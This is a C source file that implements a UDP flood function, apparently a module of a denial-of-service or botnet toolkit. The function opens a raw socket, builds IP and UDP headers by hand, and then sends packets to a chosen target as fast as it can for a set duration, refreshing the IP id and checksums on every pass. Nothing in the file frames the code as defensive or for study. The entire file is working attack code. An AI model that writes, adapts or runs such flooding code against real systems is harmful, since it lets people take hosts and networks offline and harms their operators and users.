#define _GNU_SOURCE

#include "headers/udp_attack.h"
#include "headers/checksum.h"
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

void* udp_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int udp_sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (udp_sock < 0) {
        return NULL;
    }

    int one = 1;
    const int *val = &one;
    if (setsockopt(udp_sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        close(udp_sock);
        return NULL;
    }

    int min_packet_size = sizeof(struct iphdr) + sizeof(struct udphdr);
    int packet_size = params->psize > 0 ? params->psize : 48;
    if (packet_size < min_packet_size) packet_size = min_packet_size;
    
    unsigned char *packet = malloc(packet_size);
    if (!packet) {
        close(udp_sock);
        return NULL;
    }
    memset(packet, 0, packet_size);

    struct iphdr* iph = (struct iphdr*)packet;
    struct udphdr* udph = (struct udphdr*)(packet + sizeof(struct iphdr));

    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = params->target_addr.sin_port;
    dest_addr.sin_addr = params->target_addr.sin_addr;

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(packet_size);
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = INADDR_ANY;
    iph->daddr = params->target_addr.sin_addr.s_addr;

    udph->source = htons(params->srcport > 0 ? params->srcport : (rand() % 65535));
    udph->dest = params->target_addr.sin_port;
    udph->len = htons(packet_size - sizeof(struct iphdr));
    udph->check = 0;

    time_t end_time = time(NULL) + params->duration;
    while (params->active && time(NULL) < end_time) {
        iph->id = htons(rand() % 65535);
        iph->check = generic_checksum((unsigned short*)iph, sizeof(struct iphdr));
        udph->check = tcp_udp_checksum(udph, packet_size - sizeof(struct iphdr), iph->saddr, iph->daddr, IPPROTO_UDP);
        ssize_t sent = sendto(udp_sock, packet, packet_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
        if (sent < 0) break;
    }
    free(packet);
    close(udp_sock);
    return NULL;
}
